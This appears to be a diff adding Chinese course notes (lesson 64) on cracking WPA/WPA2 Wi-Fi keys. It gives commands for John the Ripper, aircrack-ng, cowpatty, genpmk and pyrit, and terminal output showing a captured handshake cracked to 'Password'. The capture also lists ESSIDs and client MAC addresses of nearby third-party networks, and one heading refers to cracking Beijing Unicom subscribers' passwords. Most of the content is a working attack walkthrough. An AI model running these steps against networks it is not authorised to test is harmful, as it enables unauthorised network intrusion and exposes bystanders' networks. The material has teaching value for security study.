@@ -1,0 +1,320 @@
+课时64 COWPATTY 破解密码
+
+HTTP://ETUORLASLS.ORG/NETWORKING/802.11+SECURITY.+WI-FI+PROTECTED+ACCESS+AND+802.11I/
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃JTR破解密码                                                                     ┃
+┃测试效果                                                                        ┃
+┃    john --wordlist=password.lst --rules --stdout | grep -i Password123         ┃
+┃破解调用                                                                        ┃
+┃    john --wordlist=pass.list --rules --stdout | aircrack-ng -e kifi -w wpa.cap ┃
+┃北京联通手机号密码破解                                                          ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃COWPATTY破解密码                                ┃
+┃WPA密码通用破解工具                             ┃
+┃使用密码字典                                    ┃
+┃    cowpatty -r wpa.cap -f password.lst -s kifi ┃
+┃使用彩虹表(PMK)                                 ┃
+┃    genpmk -f password.lst -d pmkhash -s kifi   ┃
+┃    cowpatty -r wpa.cap -d pmkhash -s kifi      ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# ls
+1                      dic                            wpa-01.kisment.csv     wpa-02.kisment.netxml  wpa-04.cap           下载  模板
+2444.sh                Play0nLinux's virtual drives   wpa-01.kisment.netxml  wpa-03.cap             wpa-04.csv           公共  视频
+5814.pl                rock                           wpa-02.cap             wpa-03.csv             wpa-04.kismet.csv    图片  音乐
+??????                 wpa-01.cap                     wpa-02.csv             wpa-03.kismet.csv      wpa-04.kisment.netm  文档
+backbox-4.4-amd64.iso  wpa-01.csv                     wpa-02.kisment.csv     wpa-03.kismet.netxml   www.csdn.net.sql
+
+root@kali:~# rm wpa-0*
+1         5814.pl   backbox-4.4-amd64.iso  PlayOnLinux's virtual dirves  www.csdn.net.sql  公共  文档  模板  音乐
+2444.sh   ????      dict                   rock                          下载              图片  桌面  视频
+
+root@kali:~# iwconfig
+eth0      no wireless extensions.
+
+at0       no wireless extensions.
+
+wlan0mon  IEEE 802.11bgn  Mode:Monitor  Frequency:2.462 GHz Tx-Power=20 dBm
+          Retry short limit:7   RTS thr:off    Fragment thr:off
+          Power Management:off
+
+lo        no wireless extensions.
+
+root@kali:~# airodump-ng wlan0mon
+
+root@kali:~# airodump-ng wlan0mon --bssid EC:26:CA:DC:29:B6 -c 11 -w wpa
+
+root@kali:~# aircrack-ng -w /usr/share/john/password.lst wpa-01
+wpa-01.cap            wpa-01.csv            wpa-01.kismet.csv      wpa-01.kisment.netxml
+root@kali:~# aircrack-ng -w /usr/share/john/password.lst wpa-01
+wpa-01.cap            wpa-01.csv            wpa-01.kismet.csv      wpa-01.kisment.netxml
+
+root@kali:~# aircrack-ng -w /usr/share/john/password.lst wpa-01.cap
+Opening wpa-01.cap
+Read 18283 packets.
+
+   #  BSSID                ESSID                   Encryption
+
+   1  EC:26:CA:DC:29:B6    kifi                    WPA (1 handshake)
+
+Choosing first network as target.
+
+Opening wpa-01.cap
+
+                               Aircrack-ng 1.2 rc2
+
+                     [00:00:00] 265 keys tested (300.75 k/s)
+
+
+                           KEY FOUND! [ Password ]
+
+      Master Key      : 35 D2 A8 EA 41 96 A8 60 OE AF 59 8F 5C D9 66 F1
+                        CA 6E B3 8A A0 C0 B5 F7 1B 32 0A 00 E2 38 D2 DC
+
+      Transient Key   : 77 84 F7 EF 0B AC 16 BD 8A E1 42 C1 F3 44 53 34
+                        AD 08 45 0E E6 EF 17 43 B9 2E 65 DF 62 31 6B 45
+                        CE 5D 92 9B C1 F5 54 E6 E5 1C 93 3F 06 E0 90 90
+                        51 F2 5C 73 EA 6D 6C 0F A6 D2 6D BF 50 08 0E 86
+
+      EAPOL HMAC      : 4A 39 BA EE A8 83 0D 19 93 E6 8F 7A 60 18 6D 54
+
+root@kali:~# cowpatty -r wpa-01.cap -f /usr/share/john/password.lst -s kifi
+cowpatty 4.6 - WPA-PSK dictionary attack. <jwright@hasborg.com>
+
+Colleted all necessary data to mount crack against WPA2/PSK passphrase
+Starting dictionary attack. Please be patient
+
+The PSK is "Password".
+
+179 passphrases tested in 1.64 seconds: 109.36 passphrases/second
+
+root@kali:~# genpmk -f /usr/share/john/password.lst -d pmkhash -s kifi
+genpmk 1.1 - WPA-PSK precomputation attack.<jwright@hasborg.com>
+File pmkhash does not exist,creating.
+
+root@kali:~# ls
+1         5814.pl   backbox-4.4-amd64.iso  PlayOnLinux's virtual dirves  rock        wpa-01.csv         wpa-01.kismet.netxml  下载  图片  桌面  视频
+2444.sh   ????      dict                   pmkhash                       wpa-01.cap  wpa-01.kismet.csv  www.csdn.net.sql      公共  文档  模板  音乐
+
+root@kali:~# cat pmkhash
+
+root@kali:~# ls
+1                      PlayOnLinux's virtual dirves  wpa-01.kismet.netxml  桌面
+2444.sh                pmkhash                       www.csdn.net.sql      模板
+5814.pl                rock                          下载                  视频
+?????                  wpa-01.cap                    公共                  音乐
+bockbox-4.4-amd64.iso  wpa-01.csv                    图片
+dict                   wpa-01.kismet.csv             文档
+
+root@kali:~# cowpatty -r wpa-01.cap -d pmkhash -s kifi
+cowpatty 4.6 - WPA-PSK dictionary attack. <jwright@hasborg.com>
+
+Colleted all necessary data to mount crack against WPA2/PSK passphrase
+Starting dictionary attack. Please be patient
+
+The PSK is "Password".
+
+179 passphrases tested in 1.64 seconds: 97494.55 passphrases/second
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃PYRIT破解密码                                           ┃
+┃与airolib、cowpatty相同，支持基于预计算的PMK提高破解速度┃
+┃独有的优势                                              ┃
+┃    除CPU之外pyrit可以运行GPU的强大运算能力加速生成PMK  ┃
+┃    本身支持抓包获取四步握手过程，无需用Airdum抓包      ┃
+┃    也支持传统的读取airodump抓包获取四步握手的方式      ┃
+┃只抓取WAP四次握手过程包                                 ┃
+┃    pyrit -r wlan2mon -o wpapyrit.cap stripLive         ┃
+┃    pyrit -r wpapyrit.cap analyze                       ┃
+┃从airodump抓包导入并筛选                                ┃
+┃    pyrit -r wpa.cap -o wpapyrit.cap strip              ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# pyrit -r wlan0mon -o wpapyrit.cap stripLive
+Pyrit 0.4.0 (C) 2008-2011 Lukas Lueg http://pyrit.googlecode.com
+This code is distributed under the GNU General Public License v3+
+
+Parsing packets from 'wlan0mon'...
+1/1: New AccessPonit bc:d1:77:c0:87:de ('MERCURY_C087DE')
+2/2: New AccessPonit 14:75:90:21:4f:56 ('TP-LINK_4F56')
+3/3: New AccessPonit e0:06:e6:39:c3:0c（'lizhi2012')
+3/4: New Station 68:3e:34:30:0f:aa (AP ec:26:ca:dc:29:b6)
+4/9:  New AccessPonit ec:26:ca:dc:29:b5 ('kifi')
+4/21: New Station 80:71:7a:e3:51:c9 (AP 14:74:90:21:4f:56)
+4/135: New Station 58:44:98:a3:7a:18 (AP 14:74:90:21:4f:56)
+4/324: New Station e8:3e:b6:1b:19:31 (AP 14:74:90:21:4f:56)
+4/461: New Station 18:dc:56:f0:26:9f (AP 14:74:90:21:4f:56)
+4/646: New Station 90:3c:92:ba:00:cc (AP 14:74:90:21:4f:56)
+4/975: New Station e0:06:e6:39:c3:0b (AP 14:74:90:21:4f:56)
+4/1957: New Station 54:9f:13:73:02:8d (AP 14:74:90:21:4f:56)
+4/2767: New Station 68:3e:34:30:0f:aa (AP 14:74:90:21:4f:56)
+4/3286: New Station 6c:71:d9:1c:80:4c (AP 14:74:90:21:4f:56)
+5/3858: Challenge AP ec:26:ca:dc:29:b6 <-> STA 68:3e:34:30:0f:aa
+6/3859: Response AP ec:26:ca:dc:29:b6 <-> STA 68:3e:34:30:0f:aa
+6/3859: New Handshake AP ec:26:ca:dc:29:b6: HMAC_SHA1 AES, bad, spread 1
+7/3860: Confirmation AP ec:26:ca:dc:29:b6 <-> STA 68:3e:34:30:0f:aa
+7/3960  New Handshake AP ec:26:ca:dc:29:b6: HMAC_SHA1_AES, good, spread 1
+8/4065: New AccessPoint bc:14:ef:al:97:29 ('gehua01141406060486797')
+^C
+Interrupted...
+
+#1: AccessPoint d0:c7:c0:99:ec:3a ('None')
+#2: AccessPoint bc:d1:77:c0:87:de (''MERCURY_C087DE')
+#3: AccessPoint 14:75:90:21:4f:56 ('TP-LINK_4F56')
+#4: AccessPoint bc:14:ef:al:97:29 ('gehua01141406060486797')
+#5: AccessPoint ec:26:ca:dc:29:b6 ('kifi')
+  #0: Station 68:3e:34:30:0f:aa, 1 handshake(s)
+    #1: HMAC_SHA1_AES, good, spread 1
+#6: AccessPoint e0:06:e6:39:c3:0c（'lizhi2012')
+
+New pcap-file 'wpapyrit.cap' written (8 out of 6480 packets)
+
+root@kali:~# pyrit -r wpapyrit.cap analyze 
+Pyrit 0.4.0 (C) 2008-2011 Lujas lueg http://pyrit.googlecode.com
+This code is distributed under the GNU General Public License v3+
+
+Parsing file 'wpapyrit.cap' (1/1)...
+Parsed 8 packets (8 8032.11-packets),got 5 AP(s)
+
+#1: AccessPoint bc:d1:77:c0:87:de (''MERCURY_C087DE')
+#2: AccessPoint 14:75:90:21:4f:56 ('TP-LINK_4F56')
+#3: AccessPoint bc:14:ef:al:97:29 ('gehua01141406060486797')
+#4: AccessPoint ec:26:ca:dc:29:b5 ('kifi')
+  #1: Station 68:3e:34:30:0f:aa, 1 handshake(s)
+    #1: HMAC_SHA1_AES, good, spread 1
+
+#5: AccessPoint e0:06:e6:39:c3:0c（'lizhi2012')
+
+root@kali:~# pyrit -r wpa.cap -o wpapyrit.cap strip
+wpa-01.cap            wpa-01.kismet.csv          wpapyirt.cap
+wpa-01.csv            wpa-02.kismet.netxml
+
+root@kali:~# pyrit -r wpa-01.cap -o wpapyrit1.cap strip
+Pyrit 0.4.0 (C) 2008-2011 Lujas lueg http://pyrit.googlecode.com
+This code is distributed under the GNU General Public License v3+
+
+Parsing file 'wpapyrit.cap' (1/1)...
+Parsed 17 packets (17 8032.11-packets),got 1 AP(s)
+
+#1: AccessPoint ec:26:ca:dc:29:b5 ('kifi')
+  #0: Station 68:3e:34:30:0f:aa, 15 handshake(s)
+    #1: HMAC_SHA1_AES, good, spread 1
+    #2: HMAC_SHA1_AES, good, spread 3
+    #3: HMAC_SHA1_AES, good, spread 11
+    #4: HMAC_SHA1_AES, good, spread 1
+    #5: HMAC_SHA1_AES, good, spread 1
+    #6: HMAC_SHA1_AES, good, spread 1
+    #7: HMAC_SHA1_AES, good, spread 1
+    #8: HMAC_SHA1_AES, good, spread 1
+    #9: HMAC_SHA1_AES, good, spread 1
+    #10: HMAC_SHA1_AES, good, spread 5
+    #11: HMAC_SHA1_AES, good, spread 7
+    #12: HMAC_SHA1_AES, good, spread 7
+    #13: HMAC_SHA1_AES, good, spread 9
+    #14: HMAC_SHA1_AES, good, spread 9
+    #15: HMAC_SHA1_AES, good, spread 13
+
+New pcap-file 'wapapritl.cap' written (16 out of 17 packets)
+
+root@kali:~# pyrit -r wpapyrit1.cap strip
+Pyrit 0.4.0 (C) 2008-2011 Lujas lueg http://pyrit.googlecode.com
+This code is distributed under the GNU General Public License v3+
+
+Parsing file 'wpapyrit.cap' (1/1)...
+Parsed 17 packets (17 8032.11-packets),got 1 AP(s)
+
+#1: AccessPoint ec:26:ca:dc:29:b5 ('kifi')
+  #0: Station 68:3e:34:30:0f:aa, 15 handshake(s)
+    #1: HMAC_SHA1_AES, good, spread 1
+    #2: HMAC_SHA1_AES, good, spread 3
+    #3: HMAC_SHA1_AES, good, spread 11
+    #4: HMAC_SHA1_AES, good, spread 1
+    #5: HMAC_SHA1_AES, good, spread 1
+    #6: HMAC_SHA1_AES, good, spread 1
+    #7: HMAC_SHA1_AES, good, spread 1
+    #8: HMAC_SHA1_AES, good, spread 1
+    #9: HMAC_SHA1_AES, good, spread 1
+    #10: HMAC_SHA1_AES, good, spread 5
+    #11: HMAC_SHA1_AES, good, spread 7
+    #12: HMAC_SHA1_AES, good, spread 7
+    #13: HMAC_SHA1_AES, good, spread 9
+    #14: HMAC_SHA1_AES, good, spread 9
+    #15: HMAC_SHA1_AES, good, spread 13
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃PYRIT破解密码                                                                 ┃
+┃使用密码字典直接破解                                                          ┃
+┃    pyrit -r wpaprit.cap -i password.lst -b <AP MAC> attack passthrough       ┃
+┃数据库模式破解                                                                ┃
+┃    默认使用基于文件的数据库，支持连接SQL数据库，将计算的PMK存入数据库        ┃
+┃    查看默认数据库状态：pyrit eval                                            ┃
+┃    导入密码字典：pyrit -i password.lst import password (剔除了不合规的密码） ┃
+┃    制定ESSID：pyrit -e kifi create essid                                     ┃
+┃    计算PMK：pyrit batch  (发挥GPU计算能力）                                  ┃
+┃    破解密码：pyrit -r wpapyrit.cap -b <AP MAC> attack_db                     ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# pyrit -r wpaprit.cap -i /usr/share/john/password.lst -b ec:26:ca:dc:29:b6 attack passthrough
+Pyrit 0.4.0 (C) 2008-2011 Lujas lueg http://pyrit.googlecode.com
+This code is distributed under the GNU General Public License v3+
+
+Parsing file 'wpapyrit.cap' (1/1)...
+Parsed 8 packets (8 8032.11-packets),got 5 AP(s)
+
+Tried 647 PMKs so far; 238 PMKs per second.
+
+The password is 'Password'.
+
+root@kali:~# pyrit eval
+Pyrit 0.4.0 (C) 2008-2011 Lujas lueg http://pyrit.googlecode.com
+This code is distributed under the GNU General Public License v3+
+
+Connection to storage at 'file://'... connected
+Passwords availbale: 0
+
+root@kali:~# pyrit -i usr/share/john/password.lst import password
+Pyrit 0.4.0 (C) 2008-2011 Lujas lueg http://pyrit.googlecode.com
+This code is distributed under the GNU General Public License v3+
+
+Connection to storage at 'file://'... connected
+3559 lines read flushing buffers.
+
+root@kali:~# pyrit eval
+Pyrit 0.4.0 (C) 2008-2011 Lujas lueg http://pyrit.googlecode.com
+This code is distributed under the GNU General Public License v3+
+
+Connection to storage at 'file://'... connected
+Passwords availbale: 637
+
+root@kali:~# pyrit -e kifi create essid
+Pyrit 0.4.0 (C) 2008-2011 Lujas lueg http://pyrit.googlecode.com
+This code is distributed under the GNU General Public License v3+
+
+Connection to storage at 'file://'... connected
+Creates ESSID 'kifi'
+
+root@kali:~# pyrit batch
+Pyrit 0.4.0 (C) 2008-2011 Lujas lueg http://pyrit.googlecode.com
+This code is distributed under the GNU General Public License v3+
+
+Connection to storage at 'file://'... connected
+Creates ESSID 'kifi'
+Processed all workunits for ESSID 'kifi';179 PMKs per second.nd.
+
+Batchprocessing done.
+
+root@kali:~# pyrit -r wpapyrit.cap -b ec:26:ca:dc:29:b6 attack_db
+Pyrit 0.4.0 (C) 2008-2011 Lujas lueg http://pyrit.googlecode.com
+This code is distributed under the GNU General Public License v3+
+
+Connection to storage at 'file://'... connected
+Parsing file 'wpapyrit1.cap' (1/1)...
+Parsed 16 packets (16 802.11-packets), got 1 AP(s)
+
+Attacking handshake with Station 68:3e:34:30:0f:aa...
+Tried 351 PMKs so far (56.2%); 20714 PMKs per second.
+
+The password is 'Password'
